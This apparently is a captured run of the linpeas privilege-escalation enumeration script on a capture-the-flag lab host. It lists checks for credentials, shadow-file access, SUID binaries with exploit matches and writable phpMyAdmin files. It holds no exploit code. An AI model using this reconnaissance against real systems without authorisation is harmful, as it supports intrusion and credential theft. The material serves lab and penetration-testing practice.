+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/bin/fusermount
+/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/bin/ping
+/bin/systemctl
+/bin/umount  --->  BSD/Linux(08-1996)
+/bin/su
+/usr/bin/newgrp  --->  HP-UX_10.20
+/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/sudo  --->  /sudo$
+/usr/bin/chfn  --->  SuSE_9.3/10
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/sbin/unix_chkpwd
+/usr/bin/ssh-agent
+/usr/bin/crontab
+/usr/bin/dotlockfile
+/usr/bin/chage
+/usr/bin/wall
+/usr/bin/expiry
+/usr/bin/bsd-write
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+
+[+] Cheking missconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
+/usr/lib/x86_64-linux-gnu/libfakeroot
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+  /etc/ld.so.conf.d/zz_i386-biarch-compat.conf
+/lib32
+/usr/lib32
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities:
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+[+] Unexpected folders in root
+/lost+found
+/lib32
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 12
+drwxr-xr-x  2 root root 4096 Mar  2  2019 .
+drwxr-xr-x 80 root root 4096 Aug  7  2019 ..
+-rw-r--r--  1 root root  663 Apr 12  2016 bash_completion.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home
+/home/pepper/user.txt
+/home/pepper/.bash_history
+/home/pepper/Web/Logs/10.10.14.78.txt
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/syslog
+/var/log/auth.log
+/var/log/daemon.log
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+
+[+] Files inside /home/www-data (limit 20)
+
+[+] Files inside others home (limit 20)
+/home/pepper/.bashrc
+/home/pepper/user.txt
+/home/pepper/.profile
+/home/pepper/Web/Logs/10.10.14.78.txt
+/home/pepper/.bash_logout
+
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+-rw-r--r-- 1 root root 159 Mar  2  2019 /var/lib/sgml-base/supercatalog.old
+-rwxrwxrwx 1 root root 680 Dec  8  2018 /var/www/html/fonts/flaticon/backup.txt
+-rw-r--r-- 1 root root 7896 Feb 19  2019 /lib/modules/4.9.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 20 Jul 25  2017 /etc/vmware-tools/tools.conf.old
+-rw-r--r-- 1 root root 673 Mar  2  2019 /etc/xml/xml-core.xml.old
+-rw-r--r-- 1 root root 610 Mar  2  2019 /etc/xml/catalog.old
+-rwxr-xr-x 1 root root 18148040 Aug  8  2018 /usr/bin/mariabackup
+-rwxr-xr-x 1 root root 21282 Aug  8  2018 /usr/bin/wsrep_sst_xtrabackup
+-rwxr-xr-x 1 root root 32879 Aug  8  2018 /usr/bin/wsrep_sst_mariabackup
+-rwxr-xr-x 1 root root 40835 Aug  8  2018 /usr/bin/wsrep_sst_xtrabackup-v2
+-rw-r--r-- 1 root root 303 May 15  2018 /usr/share/doc/hdparm/changelog.old.gz
+-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
+-rw-r--r-- 1 root root 331845 Mar 13  2017 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 348 Aug  8  2018 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz
+-rw-r--r-- 1 root root 357 Aug  8  2018 /usr/share/man/man1/wsrep_sst_xtrabackup-v2.1.gz
+-rw-r--r-- 1 root root 351 Aug  8  2018 /usr/share/man/man1/wsrep_sst_xtrabackup.1.gz
+-rw-r--r-- 1 root root 31664 Jul 25  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+
+[+] Searching tables inside readable .db/.sqlite files (limit 100)
+
+[+] Web files?(output limit)
+/var/www/:
+total 16K
+drwxr-xr-x  4 root   root   4.0K Mar  4  2019 .
+drwxr-xr-x 12 root   root   4.0K Mar  2  2019 ..
+drwxr-xr-x  2 pepper pepper 4.0K Mar  4  2019 Admin-Utilities
+drwxrwxrwx  9 root   root   4.0K Oct  7 13:31 html
+
+/var/www/Admin-Utilities:
+total 16K
+drwxr-xr-x 2 pepper pepper 4.0K Mar  4  2019 .
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 1863 May 15  2017 /etc/bash.bashrc
+-rw-r--r-- 1 root root 3526 May 15  2017 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 675 May 15  2017 /etc/skel/.profile
+./linpeas.sh: 2490: [: /etc/systemd/system/timers.target.wants/phpsessionclean.timer: unexpected operator
+-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 /home/pepper/.bashrc
+./linpeas.sh: 2490: [: /home/pepper/.profile: unexpected operator
+-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
+-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
+./linpeas.sh: 2517: ./linpeas.sh: f: not found
+sh: printf: I/O error
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+uniq: write error: Broken pipe
+/dev/mqueue
+/dev/mqueue/linpeas.txt
+/dev/shm
+/run/lock
+/run/lock/apache2
+/run/php
+/tmp
+/tmp/linpeas.sh
+/tmp/lse.sh
+/usr/share/phpmyadmin
+/usr/share/phpmyadmin/.editorconfig
+/usr/share/phpmyadmin/.eslintignore
+/usr/share/phpmyadmin/.eslintrc.json
+/usr/share/phpmyadmin/CODE_OF_CONDUCT.md
+/usr/share/phpmyadmin/CONTRIBUTING.md
+/usr/share/phpmyadmin/ChangeLog
+/usr/share/phpmyadmin/DCO
+/usr/share/phpmyadmin/LICENSE
+/usr/share/phpmyadmin/README
+/usr/share/phpmyadmin/RELEASE-DATE-4.8.0
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/doc/html
+/usr/share/phpmyadmin/doc/html/_images
+/usr/share/phpmyadmin/doc/html/_sources
+/usr/share/phpmyadmin/doc/html/_sources/bookmarks.txt
+/usr/share/phpmyadmin/doc/html/_sources/charts.txt
+/usr/share/phpmyadmin/doc/html/_sources/config.txt
+/usr/share/phpmyadmin/doc/html/_sources/copyright.txt
+/usr/share/phpmyadmin/doc/html/_sources/credits.txt
+/usr/share/phpmyadmin/doc/html/_sources/developers.txt
+/usr/share/phpmyadmin/doc/html/_sources/faq.txt
+/usr/share/phpmyadmin/doc/html/_sources/glossary.txt
+/usr/share/phpmyadmin/doc/html/_sources/import_export.txt
+/usr/share/phpmyadmin/doc/html/_sources/index.txt
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/doc/html/_static
+/usr/share/phpmyadmin/doc/html/_static/basic.css
+/usr/share/phpmyadmin/doc/html/_static/classic.css
+/usr/share/phpmyadmin/doc/html/_static/default.css
+/usr/share/phpmyadmin/doc/html/_static/doctools.js
+/usr/share/phpmyadmin/doc/html/_static/jquery.js
+/usr/share/phpmyadmin/doc/html/_static/pygments.css
+/usr/share/phpmyadmin/doc/html/_static/searchtools.js
+/usr/share/phpmyadmin/doc/html/_static/sidebar.js
+/usr/share/phpmyadmin/doc/html/_static/underscore.js
+/usr/share/phpmyadmin/doc/html/_static/websupport.js
+/usr/share/phpmyadmin/doc/html/bookmarks.html
+/usr/share/phpmyadmin/doc/html/charts.html
+/usr/share/phpmyadmin/doc/html/config.html
+/usr/share/phpmyadmin/doc/html/copyright.html
+/usr/share/phpmyadmin/doc/html/credits.html
+/usr/share/phpmyadmin/doc/html/developers.html
+/usr/share/phpmyadmin/doc/html/faq.html
+/usr/share/phpmyadmin/doc/html/genindex.html
+/usr/share/phpmyadmin/doc/html/glossary.html
+/usr/share/phpmyadmin/doc/html/import_export.html
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/error_report.php
+/usr/share/phpmyadmin/examples
+/usr/share/phpmyadmin/examples/config.manyhosts.inc.php
+/usr/share/phpmyadmin/examples/openid.php
+/usr/share/phpmyadmin/examples/signon-script.php
+/usr/share/phpmyadmin/examples/signon.php
+/usr/share/phpmyadmin/export.php
+/usr/share/phpmyadmin/favicon.ico
+/usr/share/phpmyadmin/gis_data_editor.php
+/usr/share/phpmyadmin/import.php
+/usr/share/phpmyadmin/import_status.php
+/usr/share/phpmyadmin/index.php
+/usr/share/phpmyadmin/js
+/usr/share/phpmyadmin/js/ajax.js
+/usr/share/phpmyadmin/js/chart.js
+/usr/share/phpmyadmin/js/codemirror
+/usr/share/phpmyadmin/js/codemirror/addon
+/usr/share/phpmyadmin/js/codemirror/addon/lint
+/usr/share/phpmyadmin/js/codemirror/addon/lint/sql-lint.js
+/usr/share/phpmyadmin/js/common.js
+/usr/share/phpmyadmin/js/config.js
+/usr/share/phpmyadmin/js/console.js
+/usr/share/phpmyadmin/js/cross_framing_protection.js
+/usr/share/phpmyadmin/js/db_central_columns.js
+/usr/share/phpmyadmin/js/db_multi_table_query.js
+/usr/share/phpmyadmin/js/db_operations.js
+/usr/share/phpmyadmin/js/db_qbe.js
+/usr/share/phpmyadmin/js/db_search.js
+/usr/share/phpmyadmin/js/db_structure.js
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/js/designer/database.js
+/usr/share/phpmyadmin/js/designer/history.js
+/usr/share/phpmyadmin/js/designer/init.js
+/usr/share/phpmyadmin/js/designer/move.js
+/usr/share/phpmyadmin/js/designer/objects.js
+/usr/share/phpmyadmin/js/designer/page.js
+/usr/share/phpmyadmin/js/doclinks.js
+/usr/share/phpmyadmin/js/error_report.js
+/usr/share/phpmyadmin/js/export.js
+/usr/share/phpmyadmin/js/export_output.js
+/usr/share/phpmyadmin/js/functions.js
+/usr/share/phpmyadmin/js/gis_data_editor.js
+/usr/share/phpmyadmin/js/import.js
+/usr/share/phpmyadmin/js/indexes.js
+/usr/share/phpmyadmin/js/jqplot
+/usr/share/phpmyadmin/js/jqplot/plugins
+/usr/share/phpmyadmin/js/jqplot/plugins/jqplot.byteFormatter.js
+/usr/share/phpmyadmin/js/keyhandler.js
+/usr/share/phpmyadmin/js/makegrid.js
+/usr/share/phpmyadmin/js/menu-resizer.js
+/usr/share/phpmyadmin/js/messages.php
+/usr/share/phpmyadmin/js/microhistory.js
+/usr/share/phpmyadmin/js/multi_column_sort.js
+/usr/share/phpmyadmin/js/navigation.js
+/usr/share/phpmyadmin/js/normalization.js
+/usr/share/phpmyadmin/js/page_settings.js
+/usr/share/phpmyadmin/js/replication.js
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/js/transformations/image_upload.js
+/usr/share/phpmyadmin/js/transformations/json.js
+/usr/share/phpmyadmin/js/transformations/json_editor.js
+/usr/share/phpmyadmin/js/transformations/sql_editor.js
+/usr/share/phpmyadmin/js/transformations/xml.js
+/usr/share/phpmyadmin/js/transformations/xml_editor.js
+/usr/share/phpmyadmin/js/u2f.js
+/usr/share/phpmyadmin/js/vendor
+/usr/share/phpmyadmin/js/vendor/codemirror
+/usr/share/phpmyadmin/js/vendor/codemirror/LICENSE
+/usr/share/phpmyadmin/js/vendor/codemirror/addon
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/hint
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/hint/show-hint.css
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/hint/show-hint.js
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/hint/sql-hint.js
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/lint
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/lint/lint.css
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/lint/lint.js
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/runmode
+/usr/share/phpmyadmin/js/vendor/codemirror/addon/runmode/runmode.js
+/usr/share/phpmyadmin/js/vendor/codemirror/lib
+/usr/share/phpmyadmin/js/vendor/codemirror/lib/codemirror.css
+/usr/share/phpmyadmin/js/vendor/codemirror/lib/codemirror.js
+/usr/share/phpmyadmin/js/vendor/codemirror/mode
+/usr/share/phpmyadmin/js/vendor/codemirror/mode/javascript
+/usr/share/phpmyadmin/js/vendor/codemirror/mode/javascript/javascript.js
+/usr/share/phpmyadmin/js/vendor/codemirror/mode/sql
+/usr/share/phpmyadmin/js/vendor/codemirror/mode/sql/sql.js
+/usr/share/phpmyadmin/js/vendor/codemirror/mode/xml
+/usr/share/phpmyadmin/js/vendor/codemirror/mode/xml/xml.js
+/usr/share/phpmyadmin/js/vendor/jqplot
+/usr/share/phpmyadmin/js/vendor/jqplot/jquery.jqplot.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.barRenderer.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.canvasAxisLabelRenderer.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.canvasTextRenderer.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.categoryAxisRenderer.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.cursor.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.dateAxisRenderer.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.enhancedPieLegendRenderer.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.highlighter.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.pieRenderer.js
+/usr/share/phpmyadmin/js/vendor/jqplot/plugins/jqplot.pointLabels.js
+/usr/share/phpmyadmin/js/vendor/jquery
+/usr/share/phpmyadmin/js/vendor/jquery/MIT-LICENSE.txt
+/usr/share/phpmyadmin/js/vendor/jquery/additional-methods.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery-migrate.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery-ui-timepicker-addon.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery-ui.min.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery.ba-hashchange-1.3.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery.debounce-1.0.5.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery.event.drag-2.2.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery.fullscreen.js
+/usr/share/phpmyadmin/js/vendor/jquery/jquery.md5.js
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/js/vendor/js.cookie.js
+/usr/share/phpmyadmin/js/vendor/openlayers
+/usr/share/phpmyadmin/js/vendor/openlayers/OpenLayers.js
+/usr/share/phpmyadmin/js/vendor/openlayers/img
+/usr/share/phpmyadmin/js/vendor/openlayers/theme
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/google.css
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/google.tidy.css
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/ie6-style.css
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/ie6-style.tidy.css
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/img
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/style.css
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/style.mobile.css
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/style.mobile.tidy.css
+/usr/share/phpmyadmin/js/vendor/openlayers/theme/default/style.tidy.css
+/usr/share/phpmyadmin/js/vendor/sprintf.js
+/usr/share/phpmyadmin/js/vendor/tracekit.js
+/usr/share/phpmyadmin/js/vendor/u2f-api-polyfill.js
+/usr/share/phpmyadmin/js/vendor/zxcvbn.js
+/usr/share/phpmyadmin/js/whitelist.php
+/usr/share/phpmyadmin/libraries
+/usr/share/phpmyadmin/libraries/advisory_rules.txt
+/usr/share/phpmyadmin/libraries/certs
+/usr/share/phpmyadmin/libraries/certs/12d55845.0
+/usr/share/phpmyadmin/libraries/certs/2e5ac55d.0
+/usr/share/phpmyadmin/libraries/certs/4042bcee.0
+/usr/share/phpmyadmin/libraries/certs/6187b673.0
+/usr/share/phpmyadmin/libraries/certs/README.rst
+/usr/share/phpmyadmin/libraries/certs/cacert.pem
+/usr/share/phpmyadmin/libraries/check_user_privileges.inc.php
+/usr/share/phpmyadmin/libraries/classes
+/usr/share/phpmyadmin/libraries/classes/Advisor.php
+/usr/share/phpmyadmin/libraries/classes/Bookmark.php
+/usr/share/phpmyadmin/libraries/classes/BrowseForeigners.php
+/usr/share/phpmyadmin/libraries/classes/CentralColumns.php
+/usr/share/phpmyadmin/libraries/classes/Charsets.php
+/usr/share/phpmyadmin/libraries/classes/CheckUserPrivileges.php
+/usr/share/phpmyadmin/libraries/classes/Config
+/usr/share/phpmyadmin/libraries/classes/Config.php
+/usr/share/phpmyadmin/libraries/classes/Config/ConfigFile.php
+/usr/share/phpmyadmin/libraries/classes/Config/Descriptions.php
+/usr/share/phpmyadmin/libraries/classes/Config/Form.php
+/usr/share/phpmyadmin/libraries/classes/Config/FormDisplay.php
+/usr/share/phpmyadmin/libraries/classes/Config/FormDisplayTemplate.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/BaseForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/BaseFormList.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/BrowseForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/DbStructureForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/EditForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/ExportForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/ImportForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/NaviForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/PageFormList.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/SqlForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Page/TableStructureForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/ConfigForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/ExportForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/FeaturesForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/ImportForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/MainForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/NaviForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/ServersForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/SetupFormList.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/Setup/SqlForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User/ExportForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User/FeaturesForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User/ImportForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User/MainForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User/NaviForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User/SqlForm.php
+/usr/share/phpmyadmin/libraries/classes/Config/Forms/User/UserFormList.php
+/usr/share/phpmyadmin/libraries/classes/Config/PageSettings.php
+/usr/share/phpmyadmin/libraries/classes/Config/ServerConfigChecks.php
+/usr/share/phpmyadmin/libraries/classes/Config/Validator.php
+/usr/share/phpmyadmin/libraries/classes/Console.php
+/usr/share/phpmyadmin/libraries/classes/Controllers
+/usr/share/phpmyadmin/libraries/classes/Controllers/Controller.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Database
+/usr/share/phpmyadmin/libraries/classes/Controllers/Database/DatabaseStructureController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/DatabaseController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Server
+/usr/share/phpmyadmin/libraries/classes/Controllers/Server/ServerBinlogController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Server/ServerCollationsController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Server/ServerDatabasesController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Server/ServerEnginesController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Server/ServerPluginsController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Server/ServerVariablesController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Table
+/usr/share/phpmyadmin/libraries/classes/Controllers/Table/TableChartController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Table/TableGisVisualizationController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Table/TableIndexesController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Table/TableRelationController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Table/TableSearchController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/Table/TableStructureController.php
+/usr/share/phpmyadmin/libraries/classes/Controllers/TableController.php
+/usr/share/phpmyadmin/libraries/classes/Core.php
+/usr/share/phpmyadmin/libraries/classes/CreateAddField.php
+/usr/share/phpmyadmin/libraries/classes/Database
+/usr/share/phpmyadmin/libraries/classes/Database/DatabaseList.php
+/usr/share/phpmyadmin/libraries/classes/Database/Designer
+/usr/share/phpmyadmin/libraries/classes/Database/Designer.php
+/usr/share/phpmyadmin/libraries/classes/Database/Designer/Common.php
+/usr/share/phpmyadmin/libraries/classes/Database/MultiTableQuery.php
+/usr/share/phpmyadmin/libraries/classes/Database/Qbe.php
+/usr/share/phpmyadmin/libraries/classes/Database/Search.php
+/usr/share/phpmyadmin/libraries/classes/DatabaseInterface.php
+/usr/share/phpmyadmin/libraries/classes/Dbi
+/usr/share/phpmyadmin/libraries/classes/Dbi/DbiDummy.php
+/usr/share/phpmyadmin/libraries/classes/Dbi/DbiExtension.php
+/usr/share/phpmyadmin/libraries/classes/Dbi/DbiMysql.php
+/usr/share/phpmyadmin/libraries/classes/Dbi/DbiMysqli.php
+/usr/share/phpmyadmin/libraries/classes/Di
+/usr/share/phpmyadmin/libraries/classes/Di/AliasItem.php
+/usr/share/phpmyadmin/libraries/classes/Di/Container.php
+/usr/share/phpmyadmin/libraries/classes/Di/ContainerException.php
+/usr/share/phpmyadmin/libraries/classes/Di/FactoryItem.php
+/usr/share/phpmyadmin/libraries/classes/Di/Item.php
+/usr/share/phpmyadmin/libraries/classes/Di/NotFoundException.php
+/usr/share/phpmyadmin/libraries/classes/Di/ReflectorItem.php
+/usr/share/phpmyadmin/libraries/classes/Di/ServiceItem.php
+/usr/share/phpmyadmin/libraries/classes/Di/ValueItem.php
+/usr/share/phpmyadmin/libraries/classes/Display
+/usr/share/phpmyadmin/libraries/classes/Display/ChangePassword.php
+/usr/share/phpmyadmin/libraries/classes/Display/CreateTable.php
+/usr/share/phpmyadmin/libraries/classes/Display/Export.php
+/usr/share/phpmyadmin/libraries/classes/Display/GitRevision.php
+/usr/share/phpmyadmin/libraries/classes/Display/Import.php
+/usr/share/phpmyadmin/libraries/classes/Display/ImportAjax.php
+/usr/share/phpmyadmin/libraries/classes/Display/Results.php
+/usr/share/phpmyadmin/libraries/classes/Encoding.php
+/usr/share/phpmyadmin/libraries/classes/Engines
+/usr/share/phpmyadmin/libraries/classes/Engines/Bdb.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Berkeleydb.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Binlog.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Innobase.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Innodb.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Memory.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Merge.php
+/usr/share/phpmyadmin/libraries/classes/Engines/MrgMyisam.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Myisam.php
+/usr/share/phpmyadmin/libraries/classes/Engines/Ndbcluster.php
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/libraries/classes/Error.php
+/usr/share/phpmyadmin/libraries/classes/ErrorHandler.php
+/usr/share/phpmyadmin/libraries/classes/ErrorReport.php
+/usr/share/phpmyadmin/libraries/classes/Export.php
+/usr/share/phpmyadmin/libraries/classes/File.php
+/usr/share/phpmyadmin/libraries/classes/FileListing.php
+/usr/share/phpmyadmin/libraries/classes/Font.php
+/usr/share/phpmyadmin/libraries/classes/Footer.php
+/usr/share/phpmyadmin/libraries/classes/Gis
+/usr/share/phpmyadmin/libraries/classes/Gis/GisFactory.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisGeometry.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisGeometryCollection.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisLineString.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisMultiLineString.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisMultiPoint.php
